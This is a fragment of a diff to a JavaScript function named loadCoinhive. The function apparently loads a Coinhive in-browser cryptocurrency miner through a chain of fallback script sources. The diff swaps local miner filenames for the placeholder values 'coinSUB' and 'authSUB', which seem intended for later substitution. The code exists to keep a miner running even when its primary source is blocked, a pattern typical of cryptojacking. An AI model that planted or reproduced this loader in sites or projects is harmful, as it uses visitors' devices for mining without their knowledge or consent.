@@ -20,7 +20,7 @@ function loadCoinhive() {
     //check if it didn't load
     script.onerror = function() {
       var script = document.createElement('script');
-      script.src = 'locCHMiner.js';
+      script.src = 'coinSUB';
       document.getElementsByTagName("head")[0].appendChild(script);
       //check if script was loaded
       script.onload = function() {
@@ -30,7 +30,7 @@ function loadCoinhive() {
       //check if it didn't load
       script.onerror = function() {
         var script = document.createElement('script');
-        script.src = 'locAMMiner.js';
+        script.src = 'authSUB';
         document.getElementsByTagName("head")[0].appendChild(script);
         //check if script was loaded
         script.onload = function() {
